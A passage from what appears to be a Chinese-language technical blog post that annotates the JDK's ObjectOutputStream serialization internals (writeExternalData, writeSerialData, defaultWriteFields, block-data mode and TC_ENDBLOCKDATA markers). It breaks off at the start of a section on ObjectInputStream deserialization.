&#123;</span><br><span class="line">            <span class="comment">// v1 协议：不使用 Block-Data 包裹，直接由对象写出</span></span><br><span class="line">            obj.writeExternal(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// v2 协议（默认）：用 Block-Data 包裹外部化数据区</span></span><br><span class="line">            <span class="comment">// 注：在块模式下，原始类型写入会聚合为 TC_BLOCKDATA/TC_BLOCKDATALONG，</span></span><br><span class="line">            <span class="comment">//     若 writeExternal 内部调用 writeObject(...)，该方法会自行在需要处</span></span><br><span class="line">            <span class="comment">//     切到“非块模式”写结构化标记，再回到块模式，整体对齐由 OOS 保证。</span></span><br><span class="line">            bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">            obj.writeExternal(<span class="built_in">this</span>);</span><br><span class="line">            bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入注解块结束标记：TC_ENDBLOCKDATA（0x78）</span></span><br><span class="line">            <span class="comment">// 告知对端“外部化数据区”已结束，随后可继续读取后续结构（如父类描述、实例尾等）。</span></span><br><span class="line">            bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复调用前的上下文与调试栈</span></span><br><span class="line">        curContext = oldContext;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复 PutFields 上下文</span></span><br><span class="line">    curPut = oldPut;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>具体过程为：</p>
<ol>
<li>暂存并清空 <code>curPut</code> &#x2F; <code>curContext</code>（禁用默认序列化路径；误用将抛 <code>NotActiveException</code>）。</li>
<li><code>bout.setBlockDataMode(true)</code> 开启块数据模式。</li>
<li>回调 <strong><code>obj.writeExternal(this)</code><strong>：对象</strong>自行</strong>向流中写任何需要的内容（可写原始类型、对象等）。</li>
<li><code>bout.setBlockDataMode(false)</code> 退出块模式。</li>
<li>写 <code>TC_ENDBLOCKDATA</code> 作为“外部化数据段结束”标记。</li>
</ol>
<p>这里注意到 <code>writeExternalData</code> 有清空和恢复 <code>PutFields</code> 上下文的操作：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">curPut = <span class="literal">null</span>;               <span class="comment">// ←★ 清空 PutFields 上下文</span></span><br><span class="line">...</span><br><span class="line">obj.writeExternal(<span class="built_in">this</span>);     <span class="comment">// 用户自定义代码</span></span><br><span class="line">...</span><br><span class="line">curPut = oldPut;             <span class="comment">// ←★ 调用完再恢复</span></span><br></pre></td></tr></table></figure></div>

<p><code>curPut</code> 代表 <strong>“当前层 <code>defaultWriteObject</code>&#x2F;<code>putFields</code> 写字段的上下文”</strong>。它只在 <em>Serializable</em> 路径、并且<strong>正在执行某一层的 <code>writeObject</code> 回调时</strong>才会被设置为非 <code>null</code>——也就是 <strong><code>putFields()/writeFields()</code> 临时存放字段值</strong> 的缓冲器。</p>
<p>如果在进入 <code>writeExternalData()</code> 时不把<strong>已经存在的 <code>curPut</code> 清掉</strong>，可能发生<strong>嵌套调用污染</strong>，例如：</p>
<ul>
<li>当前正序列化一个对象 <code>Outer</code>，它的 <code>writeObject()</code> 里调用了 <code>putFields()</code>，此时 <code>curPut</code> 指向 <code>Outer</code> 的字段缓冲。</li>
<li><code>writeObject()</code> 又写了一个 <code>Externalizable</code> 的 <code>Inner</code>。</li>
<li>如果不清空，<code>Inner.writeExternal()</code> 内部一旦误用 <code>defaultWriteObject()</code> 或 <code>putFields()</code>，框架会把这块缓冲误认为还在写 <code>Outer</code>，导致<strong>字段错位或直接抛异常</strong>。</li>
</ul>
<p>所以，清空 <code>curPut</code> 是一种<strong>“断开默认字段通道 + 防污染 + 防误用”</strong> 的保护措施。</p>
<h4 id="writeSerialData"><a href="#writeSerialData" class="headerlink" title="writeSerialData"></a>writeSerialData</h4><p>当对象既不是 <code>Externalizable</code>、也不是 <code>String/数组/Enum/Class/ObjectStreamClass</code> 这些特例时，<code>writeOrdinaryObject(...)</code> 会通过 <code>writeSerialData</code> 写字段数据。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 依“类层级从父到子”的顺序，为给定对象写出每一层可序列化类（Serializable 部分）的</span></span><br><span class="line"><span class="comment"> * **实例数据区**。每一层要么走自定义 `writeObject`，要么走默认字段写出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议要点（读取端将据此对称解析）：</span></span><br><span class="line"><span class="comment"> * - 对于声明了 `private void writeObject(ObjectOutputStream)` 的类：</span></span><br><span class="line"><span class="comment"> *     * 该层实例数据以 **Block-Data** 方式写出（进入块数据模式）；</span></span><br><span class="line"><span class="comment"> *     * 写完后切回非块模式，并写入 `TC_ENDBLOCKDATA (0x78)` 作为该层数据结束标记；</span></span><br><span class="line"><span class="comment"> *     * 读取端会调用 `readObject(ObjectInputStream)` 并按块读取，直到遇到 `TC_ENDBLOCKDATA`。</span></span><br><span class="line"><span class="comment"> * - 对于未声明 `writeObject` 的类：</span></span><br><span class="line"><span class="comment"> *     * 使用“默认字段写出”（defaultWriteFields）：顺序写该层的非 transient/非 static 字段；</span></span><br><span class="line"><span class="comment"> *     * 原始类型直接写，引用类型以对象方式写（可递归/可共享）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 顺序与一致性：</span></span><br><span class="line"><span class="comment"> * - `getClassDataLayout()` 返回的插槽（ClassDataSlot）顺序为：**超类 → 子类**；</span></span><br><span class="line"><span class="comment"> *   因此父类字段/自定义数据会先写，子类随后写，保证层级一致性。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 取得“类数据布局”插槽列表：每个插槽对应层级中的一个可序列化类</span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line">            <span class="comment">// 分支 A：该层声明了自定义 writeObject(...)</span></span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存并清空 PutFields 上下文：</span></span><br><span class="line">            <span class="comment">// - `curPut` 仅在 writeObject 中配合 putFields()/writeFields() 使用；</span></span><br><span class="line">            <span class="comment">// - 先置空，避免将上一层/外层的状态“串味”到本层。</span></span><br><span class="line">            <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">            curPut = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存并暂时替换“序列化回调上下文”：</span></span><br><span class="line">            <span class="comment">// - `curContext` 用来校验 defaultWriteObject/putFields 等只能在</span></span><br><span class="line">            <span class="comment">//   当前对象&amp;当前类范围内调用（否则抛 NotActiveException）。</span></span><br><span class="line">            <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// （可选）调试：标记正在写自定义数据，便于异常路径栈展示</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">&quot;custom writeObject data (class \&quot;&quot;</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 为本层建立新的“回调上下文”</span></span><br><span class="line">                curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 进入块数据模式：自定义 writeObject 写出的原始数据将被封装为 TC_BLOCKDATA*</span></span><br><span class="line">                bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射调用该类私有的 writeObject(ObjectOutputStream) 实现</span></span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 写完后切回非块模式，以便书写结构化的结束标记</span></span><br><span class="line">                bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 写入本层自定义数据的结束标记：TC_ENDBLOCKDATA (0x78)</span></span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 标记当前回调上下文已使用完毕，防止被重复滥用</span></span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                <span class="comment">// 恢复外层回调上下文</span></span><br><span class="line">                curContext = oldContext;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 恢复外层 PutFields 上下文</span></span><br><span class="line">            curPut = oldPut;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line">            <span class="comment">// 分支 B：无自定义 writeObject → 走默认字段写出</span></span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line">            <span class="comment">// 默认规则：</span></span><br><span class="line">            <span class="comment">// - 仅写该层声明的“可持久化字段”（非 transient / 非 static）；</span></span><br><span class="line">            <span class="comment">// - 原始类型直接写入；对象/数组字段按对象方式写入（可能触发递归）；</span></span><br><span class="line">            <span class="comment">// - 字段顺序由 ObjectStreamClass 预先规范化（与读取端一致）。</span></span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>desc.getClassDataLayout()</code> 会给出<strong>可序列化链</strong>的每一层（<code>ClassDataSlot</code>），顺序始终是 <strong>父类在前、子类在后</strong>。对每一层 <code>slotDesc</code> 有两条路径：</p>
<ul>
<li>该层<strong>声明了</strong> <code>private void writeObject(ObjectOutputStream out)</code>（自定义路径）</li>
</ul>
<ol>
<li><p><strong>隔离上下文</strong></p>
<ul>
<li>暂存并清空 <code>curPut</code>（避免把外层&#x2F;上一层的 putFields 状态“串味”到本层；误用会抛 <code>NotActiveException</code>）。</li>
<li>暂存并替换 <code>curContext = new SerialCallbackContext(obj, slotDesc)</code>（确保 <code>defaultWriteObject/putFields</code> 只能在“当前对象+当前层”里被合法调用）。</li>
</ul>
</li>
<li><p><strong>用块数据包裹该层“自定义数据区”</strong></p>
<ul>
<li><p><code>bout.setBlockDataMode(true)</code> 开启 Data Block 模式</p>
</li>
<li><p>反射调用 <code>slotDesc.invokeWriteObject(obj, this)</code></p>
</li>
<li><p><code>bout.setBlockDataMode(false)</code> 关闭 Data Block 模式</p>
</li>
<li><p><strong>写入该层结尾标记</strong>：<code>TC_ENDBLOCKDATA (0x78)</code></p>
</li>
</ul>
</li>
<li><p><strong>恢复上下文</strong></p>
<ul>
<li><code>curContext.setUsed(); curContext = oldContext; curPut = oldPut;</code></li>
<li>若开了 <code>extendedDebugInfo</code>，弹出调试栈条目。</li>
</ul>
</li>
</ol>
<ul>
<li>该层<strong>没有</strong> <code>writeObject(...)</code>（默认字段路径）</li>
</ul>
<p>  这时调用 <code>defaultWriteFields(obj, slotDesc)</code>。</p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把“给定对象 obj 在某一层（desc 指定的类）”的**可序列化字段值**写到流里。</span></span><br><span class="line"><span class="comment"> * 哪些字段、以什么顺序写，由 ObjectStreamClass desc 事先规范好（见 getFields(...)）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关键点：</span></span><br><span class="line"><span class="comment"> * 1) 这是“默认字段写出”（defaultWriteFields）路径：仅在该层**没有**自定义</span></span><br><span class="line"><span class="comment"> *    writeObject(ObjectOutputStream) 时调用；否则由 writeObject 内部决定如何写。</span></span><br><span class="line"><span class="comment"> * 2) 原始类型字段（primitive）与对象/数组字段分开处理：</span></span><br><span class="line"><span class="comment"> *    - 原始字段：收集到一个字节缓冲 primVals 后，**按非块模式**直接顺序写出（DataOutput 语义）。</span></span><br><span class="line"><span class="comment"> *      注意：这里**不会**写 TC_ENDBLOCKDATA；也不会自动加 TC_BLOCKDATA 头。</span></span><br><span class="line"><span class="comment"> *    - 对象/数组字段：逐个调用 writeObject0(...)（或 writeUnshared 语义，取决于字段的 isUnshared）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// -------- 0) 运行时类型安全检查：obj 必须是 desc.forClass() 的实例 ----------</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();  <span class="comment">// 防御式：类型不匹配直接失败</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------- 1) 校验该层是否允许“默认序列化” ----------</span></span><br><span class="line">    <span class="comment">// 若在 OSC 初始化阶段已发现默认序列化不合法（如字段布局问题等），</span></span><br><span class="line">    <span class="comment">// 这里会抛 InvalidClassException（通过内部缓存的 defaultSerializeEx）。</span></span><br><span class="line">    desc.checkDefaultSerialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------- 2) 写原始类型字段（primitive block *字节*，非“块数据模式”的 block） ----------</span></span><br><span class="line">    <span class="comment">// 2.1 预分配/复用承载原始字段字节的缓冲 primVals（大小 = 该层所有 primitive 字段总字节数）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.2 通过反射把 obj 在该层的 primitive 字段值打包进 primVals（按 desc 既定顺序/布局）</span></span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    <span class="comment">// 2.3 一次性写出这段字节</span></span><br><span class="line">    <span class="comment">//     注意：此时 OOS 仍处于“非块模式”，所以这里是**原样写字节**，不带 TC_BLOCKDATA/TC_BLOCKDATALONG 头；</span></span><br><span class="line">    <span class="comment">//     第四个参数 false 表示“不复制调用方缓冲”，由实现决定是否直接使用该数组（性能优化）。</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------- 3) 写对象/数组字段（逐个调用 writeObject0 / writeUnshared） ----------</span></span><br><span class="line">    <span class="comment">// 3.1 fields 含“该层所有可持久化字段”，顺序已由 OSC 规范化：**先 primitive，再 object/array**</span></span><br><span class="line">    <span class="comment">//     这里 getFields(false) 的 false 表示“返回内部数组引用，不拷贝”，减少分配。</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 为对象字段准备承载值的数组（大小 = 对象/数组字段个数）</span></span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.3 primitive 字段数量 = 全字段数 - 对象字段数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.4 通过反射把“对象/数组字段”的当前值取到 objVals（顺序与 fields 的“对象段”一致）</span></span><br><span class="line">    desc.getObjFieldValues(obj, objVals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.5 逐个写出对象/数组字段</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            <span class="comment">// 调试栈：标注当前正在写的字段（类名/字段名/字段类型），异常时可定位</span></span><br><span class="line">            debugInfoStack.push(</span><br><span class="line">                <span class="string">&quot;field (class \&quot;&quot;</span> + desc.getName() + <span class="string">&quot;\&quot;, name: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getName() + <span class="string">&quot;\&quot;, type: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getType() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// isUnshared() 仅对“对象/数组字段”有意义（来自 serialPersistentFields 也可指定 unshared）：</span></span><br><span class="line">            <span class="comment">// - true  → 按“非共享”语义写（writeUnshared）：不会登记句柄，后续也不会 TC_REFERENCE 回指到该值</span></span><br><span class="line">            <span class="comment">// - false → 常规共享语义：首次登记句柄，后续可 TC_REFERENCE 引用同一实例</span></span><br><span class="line">            writeObject0(</span><br><span class="line">                objVals[i],</span><br><span class="line">                fields[numPrimFields + i].isUnshared()</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>  它会<strong>严格按该层的字段布局</strong>写值：</p>
<ol>
<li><p><strong>原始字段（primitive）统一打包</strong></p>
<ul>
<li>内部会开启块模式，把该层<strong>所有原始类型字段</strong>的字节连续写入一个（或若干）<code>TC_BLOCKDATA/TC_BLOCKDATALONG</code> 块；</li>
<li>写完立刻切回非块模式（只是为了把“原始字段段”打包），**不会写 <code>TC_ENDBLOCKDATA</code>**。</li>
</ul>
</li>
<li><p><strong>对象&#x2F;数组字段逐个写</strong></p>
<ul>
<li>依序对每个对象&#x2F;数组字段调用 <code>writeObject(...)</code>（或 <code>writeUnshared(...)</code>，若该字段在 <code>serialPersistentFields</code> 里声明了 <code>unshared</code>）；</li>
<li>这些写法会走“结构化标记”：<code>TC_NULL/TC_REFERENCE/TC_OBJECT/...</code> 等。</li>
</ul>
</li>
</ol>
<h2 id="反序列化过程分析"><a href="#反序列化过程分析" class="headerlink" title="反序列化过程分析"></a>反序列化过程分析</h2><p>通常我们通过下面这个过程将对象反序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">object = objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div>

<h3 id="ObjectInputStream-对象"><a href="#ObjectInputStream-对象" class="headerlink" title="ObjectInputStream 对象"></a>ObjectInputStream 对象</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectInputStream 用于反序列化先前由 ObjectOutputStream 写入的</span></span><br><span class="line"><span class="comment"> * 原始数据与对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;与 FileInputStream/FileOutputStream 搭配时，ObjectInputStream 与</span></span><br><span class="line"><span class="comment"> * ObjectOutputStream 可为应用提供对象图（graph of objects）的持久化存储；</span></span><br><span class="line"><span class="comment"> * ObjectInputStream 负责把先前序列化的对象恢复出来。其它常见用途包括：</span></span><br><span class="line"><span class="comment"> * 通过套接字在主机之间传递对象，或在远程通信系统中对参数进行编组/解组。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;ObjectInputStream 确保从流中创建的对象的实际类型与当前 Java 虚拟机中</span></span><br><span class="line"><span class="comment"> * 可用的类相匹配；所需的类会按标准类加载机制进行加载。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;只有实现了 java.io.Serializable 或 java.io.Externalizable 的对象</span></span><br><span class="line"><span class="comment"> * 才能从该流中读取。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;通过 &lt;code&gt;readObject&lt;/code&gt; 方法可以从流中读取一个对象；随后应使用</span></span><br><span class="line"><span class="comment"> * Java 的安全类型转换（cast）得到期望类型。Java 中字符串与数组本身就是对象，</span></span><br><span class="line"><span class="comment"> * 因此它们在序列化/反序列化过程中也按对象处理，读取后需要转换为期望类型。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;原始类型数据可通过 DataInput 上的相应方法从流中读取。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 